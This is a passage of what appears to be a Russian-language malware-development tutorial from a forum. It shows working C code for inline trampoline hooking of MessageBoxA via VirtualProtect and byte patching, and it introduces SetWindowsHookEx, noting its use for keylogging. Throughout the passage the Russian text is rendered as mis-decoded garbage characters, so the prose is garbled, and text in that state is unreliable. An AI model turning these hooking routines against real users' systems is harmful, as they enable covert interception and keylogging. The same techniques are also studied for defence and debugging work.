–ß—Ç–æ–±—ã —É–ø—Ä–æ—Å—Ç–∏—Ç—å —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—é, –±—ã–ª–∞ —Å–æ–∑–¥–∞–Ω–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ HookSt. –≠—Ç–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ –±—É–¥–µ—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å –Ω–µ–æ–±—Ö–æ–¥–∏–º—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –∏ –æ—Ç–∫–ª—é—á–µ–Ω–∏—è —Ö—É–∫–∞ –Ω–∞ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—É—é —Ñ—É–Ω–∫—Ü–∏—é. –ó–Ω–∞—á–µ–Ω–∏–µ TRAMPOLINE_SIZE —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –Ω–∞ 13, –µ—Å–ª–∏ –ø—Ä–æ–≥—Ä–∞–º–º–∞ –∫–æ–º–ø–∏–ª–∏—Ä—É–µ—Ç—Å—è –∫–∞–∫ 64-–±–∏—Ç–Ω–æ–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ, –∏ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –Ω–∞ 7, –µ—Å–ª–∏ –ø—Ä–æ–≥—Ä–∞–º–º–∞ –∫–æ–º–ø–∏–ª–∏—Ä—É–µ—Ç—Å—è –≤ —Ä–µ–∂–∏–º–µ 32-–±–∏—Ç. –ó–Ω–∞—á–µ–Ω–∏—è 13 –∏ 7 - —ç—Ç–æ —Ä–∞–∑–º–µ—Ä—ã —Ç—Ä–∞–º–ø–ª–∏–Ω–æ–≤–æ–≥–æ —à–µ–ª–ª–∫–æ–¥–∞, —É–∫–∞–∑–∞–Ω–Ω—ã–µ –≤ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π uTrampoline, –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–Ω–æ–π —Ä–∞–Ω–µ–µ, –¥–ª—è 64-–±–∏—Ç–Ω—ã—Ö –∏ 32-–±–∏—Ç–Ω—ã—Ö —Å–∏—Å—Ç–µ–º —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _HookSt{

    PVOID    pFunctionToHook;                  // –∞–¥—Ä–µ—Å —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ —Ö—É–∫–∞
    PVOID    pFunctionToRun;                   // –∞–¥—Ä–µ—Å —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –≤–º–µ—Å—Ç–æ
    BYTE    pOriginalBytes[TRAMPOLINE_SIZE];  // –±—É—Ñ–µ—Ä –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –Ω–µ–∫–æ—Ç–æ—Ä—ã—Ö –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã—Ö –±–∞–π—Ç–æ–≤ (–Ω–µ–æ–±—Ö–æ–¥–∏–º –¥–ª—è –æ—á–∏—Å—Ç–∫–∏)
    DWORD    dwOldProtection;                  // —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç —Å—Ç–∞—Ä–æ–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ –ø–∞–º—è—Ç–∏ –ø–æ –∞–¥—Ä–µ—Å—É &quot;—Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ —Ö—É–∫–∞&quot; (–Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –¥–ª—è –æ—á–∏—Å—Ç–∫–∏)

}HookSt, *PHookSt;</code></pre>
	</div>
</div><br />
–£—Å—Ç–∞–Ω–æ–≤–∫–∞ –∑–Ω–∞—á–µ–Ω–∏—è TRAMPOLINE_SIZE –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è —Å –ø–æ–º–æ—â—å—é —Å–ª–µ–¥—É—é—â–µ–≥–æ –ø—Ä–µ–ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–Ω–æ–≥–æ –∫–æ–¥–∞:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –µ—Å–ª–∏ –∫–æ–º–ø–∏–ª—è—Ü–∏—è –∫–∞–∫ 64-–±–∏—Ç
#ifdef _M_X64
#define TRAMPOLINE_SIZE        13
#endif // _M_X64
// –µ—Å–ª–∏ –∫–æ–º–ø–∏–ª—è—Ü–∏—è –∫–∞–∫ 32-–±–∏—Ç
#ifdef _M_IX86
#define TRAMPOLINE_SIZE        7
#endif // _M_IX86</code></pre>
	</div>
</div><br />
<b>–£—Å—Ç–∞–Ω–æ–≤–∫–∞ —Ö—É–∫–æ–≤</b><br />
<br />
–°–ª–µ–¥—É—é—â–∞—è —Ñ—É–Ω–∫—Ü–∏—è –∏—Å–ø–æ–ª—å–∑—É–µ—Ç HookSt –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ —Ö—É–∫–æ–≤.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL InstallHook (IN PHookSt Hook) {

#ifdef _M_X64
// 64-–±–∏—Ç–Ω—ã–π —Ç—Ä–∞–º–ø–ª–∏–Ω
    uint8_t    uTrampoline [] = {
            0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, pFunctionToRun
            0x41, 0xFF, 0xE2                                            // jmp r10
    };

    // –ü—Ä–æ–ø–∞—Ç—á–∏–≤–∞–Ω–∏–µ —à–µ–ª–ª–∫–æ–¥–∞ –∞–¥—Ä–µ—Å–æ–º –¥–ª—è –ø–µ—Ä–µ—Ö–æ–¥–∞ (pFunctionToRun)
    uint64_t uPatch = (uint64_t)(Hook-&gt;pFunctionToRun);
    // –ö–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–µ –∞–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è –ø–µ—Ä–µ—Ö–æ–¥–∞ –≤ —Å–º–µ—â–µ–Ω–∏–µ &#039;2&#039; –≤ uTrampoline
    memcpy(&amp;uTrampoline[2], &amp;uPatch, sizeof(uPatch));
#endif // _M_X64

#ifdef _M_IX86
// 32-–±–∏—Ç–Ω—ã–π —Ç—Ä–∞–º–ø–ª–∏–Ω
    uint8_t    uTrampoline[] = {
       0xB8, 0x00, 0x00, 0x00, 0x00,     // mov eax, pFunctionToRun
       0xFF, 0xE0                        // jmp eax
    };

    // –ü—Ä–æ–ø–∞—Ç—á–∏–≤–∞–Ω–∏–µ —à–µ–ª–ª–∫–æ–¥–∞ –∞–¥—Ä–µ—Å–æ–º –¥–ª—è –ø–µ—Ä–µ—Ö–æ–¥–∞ (pFunctionToRun)
    uint32_t uPatch = (uint32_t)(Hook-&gt;pFunctionToRun);
    // –ö–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–µ –∞–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è –ø–µ—Ä–µ—Ö–æ–¥–∞ –≤ —Å–º–µ—â–µ–Ω–∏–µ &#039;1&#039; –≤ uTrampoline
    memcpy(&amp;uTrampoline[1], &amp;uPatch, sizeof(uPatch));
#endif // _M_IX86

    // –†–∞–∑–º–µ—â–µ–Ω–∏–µ —Ç—Ä–∞–º–ø–ª–∏–Ω–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ - —É—Å—Ç–∞–Ω–æ–≤–∫–∞ —Ö—É–∫–∞
    memcpy(Hook-&gt;pFunctionToHook, uTrampoline, sizeof(uTrampoline));

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–°–Ω—è—Ç–∏–µ —Ö—É–∫–æ–≤</b><br />
<br />
–§—É–Ω–∫—Ü–∏—è –Ω–∏–∂–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç HookSt –¥–ª—è —Å–Ω—è—Ç–∏—è —Ö—É–∫–æ–≤.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL RemoveHook (IN PHookSt Hook) {

    DWORD    dwOldProtection        = NULL;

    // –ö–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–µ –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã—Ö –±–∞–π—Ç–æ–≤ –Ω–∞–∑–∞–¥
    memcpy(Hook-&gt;pFunctionToHook, Hook-&gt;pOriginalBytes, TRAMPOLINE_SIZE);
    // –û—á–∏—Å—Ç–∫–∞ –Ω–∞—à–µ–≥–æ –±—É—Ñ–µ—Ä–∞
    memset(Hook-&gt;pOriginalBytes, &#039;\0&#039;, TRAMPOLINE_SIZE);
    // –£—Å—Ç–∞–Ω–æ–≤–∫–∞ —Å—Ç–∞—Ä–æ–≥–æ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –ø–∞–º—è—Ç–∏ –æ–±—Ä–∞—Ç–Ω–æ –≤ —Ç–æ, —á—Ç–æ –±—ã–ª–æ –¥–æ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ —Ö—É–∫–∞
    if (!VirtualProtect(Hook-&gt;pFunctionToHook, TRAMPOLINE_SIZE, Hook-&gt;dwOldProtection, &amp;dwOldProtection)) {
        printf(&quot;[!] VirtualProtect Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –≤—Å–µ—Ö –∑–Ω–∞—á–µ–Ω–∏–π –≤ null
    Hook-&gt;pFunctionToHook   = NULL;
    Hook-&gt;pFunctionToRun    = NULL;
    Hook-&gt;dwOldProtection   = NULL;

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–ó–∞–ø–æ–ª–Ω–µ–Ω–∏–µ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã HookSt</b><br />
<br />
–§—É–Ω–∫—Ü–∏—è InitializeHookStruct –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è —Å—Ç—Ä—É–∫—Ç—É—Ä—ã HookSt –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–µ–π –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ —Ö—É–∫–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL InitializeHookStruct(IN PVOID pFunctionToHook, IN PVOID pFunctionToRun, OUT PHookSt Hook) {

    // –ó–∞–ø–æ–ª–Ω–µ–Ω–∏–µ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã
    Hook-&gt;pFunctionToHook   = pFunctionToHook;
    Hook-&gt;pFunctionToRun    = pFunctionToRun;

    // –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã—Ö –±–∞–π—Ç–æ–≤ —Ç–æ–≥–æ –∂–µ —Ä–∞–∑–º–µ—Ä–∞, –∫–æ—Ç–æ—Ä—ã–π –º—ã –±—É–¥–µ–º –ø–µ—Ä–µ–∑–∞–ø–∏—Å—ã–≤–∞—Ç—å (—Ç–æ –µ—Å—Ç—å TRAMPOLINE_SIZE)
    // –≠—Ç–æ –¥–µ–ª–∞–µ—Ç—Å—è –¥–ª—è –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –æ—á–∏—Å—Ç–∫–∏ –ø—Ä–∏ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–∏
    memcpy(Hook-&gt;pOriginalBytes, pFunctionToHook, TRAMPOLINE_SIZE);

    // –ò–∑–º–µ–Ω–µ–Ω–∏–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –Ω–∞ RWX, —á—Ç–æ–±—ã –º–æ–∂–Ω–æ –±—ã–ª–æ –∏–∑–º–µ–Ω—è—Ç—å –±–∞–π—Ç—ã
    // –ú—ã —Å–æ—Ö—Ä–∞–Ω—è–µ–º —Å—Ç–∞—Ä–æ–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ –≤ —Å—Ç—Ä—É–∫—Ç—É—Ä–µ (–¥–ª—è –ø–æ—Å–ª–µ–¥—É—é—â–µ–≥–æ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è)
    if (!VirtualProtect(pFunctionToHook, TRAMPOLINE_SIZE, PAGE_EXECUTE_READWRITE, &amp;Hook-&gt;dwOldProtection)) {
        printf(&quot;[!] VirtualProtect Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è</b><br />
<br />
–û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –Ω–∏–∂–µ –≤—ã–∑—ã–≤–∞–µ—Ç —Ä–∞–Ω–µ–µ –ø—Ä–æ–¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –∏ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç —Ö—É–∫ –Ω–∞ WinAPI MessageBoxA.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>int main() {

    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å—Ç—Ä—É–∫—Ç—É—Ä—ã (–Ω–µ–æ–±—Ö–æ–¥–∏–º–∞ –¥–æ —É—Å—Ç–∞–Ω–æ–≤–∫–∏/—Å–Ω—è—Ç–∏—è —Ö—É–∫–∞)
    HookSt st = { 0 };

    if (!InitializeHookStruct(&amp;MessageBoxA, &amp;MyMessageBoxA, &amp;st)) {
        return -1;
    }

    // –±—É–¥–µ—Ç –∑–∞–ø—É—â–µ–Ω–æ
    MessageBoxA(NULL, &quot;–ß—Ç–æ –≤—ã –¥—É–º–∞–µ—Ç–µ –æ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û?&quot;, &quot;–û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ&quot;, MB_OK | MB_ICONQUESTION);

    // —É—Å—Ç–∞–Ω–æ–≤–∫–∞ —Ö—É–∫–∞
    if (!InstallHook(&amp;st)) {
        return -1;
    }

    // –Ω–µ –±—É–¥–µ—Ç –∑–∞–ø—É—â–µ–Ω–æ - —Å —Ö—É–∫–æ–º
    MessageBoxA(NULL, &quot;–†–∞–∑—Ä–∞–±–æ—Ç–∫–∞ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û - —ç—Ç–æ –ø–ª–æ—Ö–æ&quot;, &quot;–û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ&quot;, MB_OK | MB_ICONWARNING);

    // —Å–Ω—è—Ç–∏–µ —Ö—É–∫–∞
    if (!RemoveHook(&amp;st)) {
        return -1;
    }

    // –±—É–¥–µ—Ç –∑–∞–ø—É—â–µ–Ω–æ - —Ö—É–∫ –æ—Ç–∫–ª—é—á–µ–Ω
    MessageBoxA(NULL, &quot;–û–±—ã—á–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ —Å–Ω–æ–≤–∞&quot;, &quot;–û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ&quot;, MB_OK | MB_ICONINFORMATION);

    return 0;
}</code></pre>
	</div>
</div><br />
<b>–ü–µ—Ä–µ—Ö–≤–∞—Ç API - –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ API Windows</b><br />
<br />
–í—ã–∑–æ–≤ WinAPI SetWindowsHookEx —è–≤–ª—è–µ—Ç—Å—è –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–º –º–µ—Ç–æ–¥–æ–º –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ API. –û–Ω –ø—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–µ–Ω–Ω–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã—Ö —Ç–∏–ø–æ–≤ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö —Å–æ–±—ã—Ç–∏–π, —á—Ç–æ –æ—Ç–ª–∏—á–∞–µ—Ç—Å—è –æ—Ç —Ç–µ—Ö–Ω–∏–∫, –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã—Ö –≤ –ø—Ä–µ–¥—ã–¥—É—â–∏—Ö –º–æ–¥—É–ª—è—Ö, —Ç–∞–∫ –∫–∞–∫ SetWindowsHookExW/A –Ω–µ –∏–∑–º–µ–Ω—è–µ—Ç —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—å —Ñ—É–Ω–∫—Ü–∏–∏, –∞ –≤–º–µ—Å—Ç–æ —ç—Ç–æ–≥–æ –≤—ã–ø–æ–ª–Ω—è–µ—Ç –æ–±—Ä–∞—Ç–Ω—ã–π –≤—ã–∑–æ–≤ —Ñ—É–Ω–∫—Ü–∏–∏ –∫–∞–∂–¥—ã–π —Ä–∞–∑, –∫–æ–≥–¥–∞ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–µ —Å–æ–±—ã—Ç–∏–µ.<br />
<br />
–¢–∏–ø—ã —Å–æ–±—ã—Ç–∏–π –æ–≥—Ä–∞–Ω–∏—á–µ–Ω—ã —Ç–µ–º–∏, —á—Ç–æ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç Windows.<br />
<br />
<b>–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ SetWindowsHookEx</b><br />
<br />
WinAPI SetWindowsHookExW –ø–æ–∫–∞–∑–∞–Ω –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>HHOOK SetWindowsHookExW(
  [–≤—Ö–æ–¥] int       idHook,      // –¢–∏–ø –ø—Ä–æ—Ü–µ–¥—É—Ä—ã –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω
  [–≤—Ö–æ–¥] HOOKPROC  lpfn,        // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –ø—Ä–æ—Ü–µ–¥—É—Ä—É –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ (—Ñ—É–Ω–∫—Ü–∏—é –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è)
  [–≤—Ö–æ–¥] HINSTANCE hmod,        // –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä DLL, —Å–æ–¥–µ—Ä–∂–∞—â–µ–π –ø—Ä–æ—Ü–µ–¥—É—Ä—É –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ (—ç—Ç–æ –æ—Å—Ç–∞–≤–ª—è—é—Ç –∫–∞–∫ NULL)
  [–≤—Ö–æ–¥] DWORD     dwThreadId   // Id –ø–æ—Ç–æ–∫–∞, —Å –∫–æ—Ç–æ—Ä—ã–º –±—É–¥–µ—Ç –∞—Å—Å–æ—Ü–∏–∏—Ä–æ–≤–∞–Ω–∞ –ø—Ä–æ—Ü–µ–¥—É—Ä–∞ –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ (—ç—Ç–æ –æ—Å—Ç–∞–≤–ª—è—é—Ç –∫–∞–∫ NULL)
);</code></pre>
	</div>
</div><br />
idHook - –°–æ–±—ã—Ç–∏–µ, –∫–æ—Ç–æ—Ä–æ–µ –±—É–¥–µ—Ç –æ—Ç—Å–ª–µ–∂–∏–≤–∞—Ç—å—Å—è. –ù–∞–ø—Ä–∏–º–µ—Ä, —Ñ–ª–∞–≥ WH_KEYBOARD_LL –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è —Å–æ–æ–±—â–µ–Ω–∏–π –Ω–∞–∂–∞—Ç–∏—è –∫–ª–∞–≤–∏—à, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–≥—É—Ç –¥–µ–π—Å—Ç–≤–æ–≤–∞—Ç—å –∫–∞–∫ –∫–µ–π–ª–æ–≥–≥–µ—Ä.<br />
–û–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ, —á—Ç–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ SetWindowsHookEx –¥–ª—è –∫–µ–π–ª–æ–≥–≥–∏–Ω–≥–∞ - —Å—Ç–∞—Ä—ã–π —Ç—Ä—é–∫. –í —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è —Ñ–ª–∞–≥ WH_MOUSE_LL –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è –∫–ª–∏–∫–æ–≤ –º—ã—à–∏.<br />
<br />
lpfn - –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ —Ñ—É–Ω–∫—Ü–∏—é –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, –∫–æ—Ç–æ—Ä–∞—è –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –≤—Å—è–∫–∏–π —Ä–∞–∑, –∫–æ–≥–¥–∞ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç —É–∫–∞–∑–∞–Ω–Ω–æ–µ —Å–æ–±—ã—Ç–∏–µ. –í –¥–∞–Ω–Ω–æ–º —Å–ª—É—á–∞–µ —Ñ—É–Ω–∫—Ü–∏—è –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è –ø—Ä–∏ –∫–∞–∂–¥–æ–º –∫–ª–∏–∫–µ –º—ã—à–∏.<br />
<br />
<b>–§—É–Ω–∫—Ü–∏—è –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞</b><br />
<br />
–§—É–Ω–∫—Ü–∏—è –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å —Ç–∏–ø–∞ HOOKPROC, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–∫–∞–∑–∞–Ω –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef LRESULT (CALLBACK* HOOKPROC)(int nCode, WPARAM wParam, LPARAM lParam);</code></pre>
	</div>
</div><br />
–¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, —Ñ—É–Ω–∫—Ü–∏—è –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∞, –∫–∞–∫ —Ñ—É–Ω–∫—Ü–∏—è –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>LRESULT HookCallbackFunc(int nCode, WPARAM wParam, LPARAM lParam){
  // –∫–æ–¥ —Ñ—É–Ω–∫—Ü–∏–∏
}</code></pre>
	</div>
</div><br />
–§—É–Ω–∫—Ü–∏—è –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ —Ç–∞–∫–∂–µ –¥–æ–ª–∂–Ω–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å WinAPI CallNextHookEx –∏ –≤–æ–∑–≤—Ä–∞—â–∞—Ç—å –µ–≥–æ —Ä–µ–∑—É–ª—å—Ç–∞—Ç. CallNextHookEx –ø–µ—Ä–µ–¥–∞–µ—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–µ—Ä–µ—Ö–≤–∞—Ç–µ —Å–ª–µ–¥—É—é—â–µ–π –ø—Ä–æ—Ü–µ–¥—É—Ä–µ –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ –≤ —Ü–µ–ø–æ—á–∫–µ –ø–µ—Ä–µ—Ö–≤–∞—Ç–æ–≤. –î—Ä—É–≥–∏–º–∏ —Å–ª–æ–≤–∞–º–∏, –æ–Ω –ø–µ—Ä–µ–¥–∞—Å—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–µ—Ä–µ—Ö–≤–∞—Ç–µ —Ñ—É–Ω–∫—Ü–∏–∏ –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –≤ —Å–ª–µ–¥—É—é—â–∏–π —Ä–∞–∑, –∫–æ–≥–¥–∞ –æ–Ω–∞ –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∞.<br />
<br />
